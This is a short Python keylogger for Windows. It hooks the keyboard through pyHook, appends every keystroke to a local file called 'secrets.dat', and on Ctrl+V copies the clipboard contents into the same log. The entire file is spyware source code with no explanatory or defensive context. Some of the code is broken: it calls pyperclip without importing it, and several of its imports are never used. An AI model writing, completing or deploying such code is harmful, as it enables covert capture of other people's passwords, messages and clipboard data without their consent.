import os
import win32clipboard as w
from lxml import html
import time
import win32api
import pythoncom
import pyHook

f_name = "secrets.dat"

def keypressed(event):
    global data
    if event.Ascii == 13:
        keys = '\n'
        fp = open(f_name,'a')
        data = keys            
        fp.write(data)
        fp.close()
    elif event.Ascii == 8:
            keys = '<BS>'
            fp = open(f_name,'a')
            data = keys            
            fp.write(data)
            fp.close()
    elif event.Ascii == 9:
            keys = '\t'
            fp = open(f_name,'a')
            data = keys
            fp.write(data)
            fp.close()
    elif event.Ascii == 27:
            keys = '<ESC>'
            fp = open(f_name,'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii in [1, 3, 19, 0, 24]:
        pass
    elif event.Ascii == 22:
            keys = pyperclip.paste()
            fp = open(f_name,'a')
            data = keys
            fp.write("###########START  CLIPBOARD#############\n")
            fp.write(data + "\n")
            fp.write("###########STOP  CLIPBOARD#############\n")
            fp.close()
    else:
        keys = chr(event.Ascii)
        fp = open(f_name,'a')
        data = keys
        fp.write(data)
        fp.close()

def log_it():
    obj = pyHook.HookManager()
    obj.KeyDown = keypressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()
    
log_it()
